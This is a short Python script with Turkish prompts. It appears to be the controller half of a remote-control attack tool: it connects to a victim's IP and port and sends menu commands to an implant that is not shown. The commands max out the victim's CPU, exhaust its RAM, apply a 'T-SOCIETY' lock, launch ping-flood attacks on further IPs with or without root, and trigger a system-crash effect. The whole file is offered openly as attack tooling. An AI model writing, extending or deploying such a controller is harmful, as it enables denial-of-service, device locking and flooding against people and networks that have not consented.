import socket

hedef_ip = input("📲 Hedef IP >> ")
port = int(input("📦 Port >> "))

s = socket.socket()
try:
    s.connect((hedef_ip, port))
    print(f"[✓] Bağlandı: {hedef_ip}:{port}")
except:
    print("[!] Bağlantı hatası")
    exit()

while True:
    print("""
====== KOMUT MENÜSÜ ======
1. 💣 killall     → CPU %100
2. 🧠 coker       → RAM patlat
3. 🔒 kilit       → T-SOCIETY kilidi
4. 📡 wifi        → Ping çökertme (root'suz)
5. 🔥 wifi-root   → Root'lu tam ping saldırı
6. 💀 cokus       → Anlık sistem çökme efekti
0. 🚪 çık
==========================
""")
    komut = input("Komut >> ")
    if komut == "1":
        s.send(b"killall")
    elif komut == "2":
        s.send(b"coker")
    elif komut == "3":
        s.send(b"kilit")
    elif komut == "4":
        hedef = input("📡 Hedef IP: ")
        s.send(f"wifi:{hedef}".encode())
    elif komut == "5":
        hedef = input("🔥 Hedef IP (ROOT): ")
        s.send(f"wifiroot:{hedef}".encode())
    elif komut == "6":
        s.send(b"cokus")
    elif komut == "0":
        s.send(b"exit")
        print("[✓] Bağlantı kapatıldı.")
        break
    else:
        print("❌ Geçersiz komut.")
          
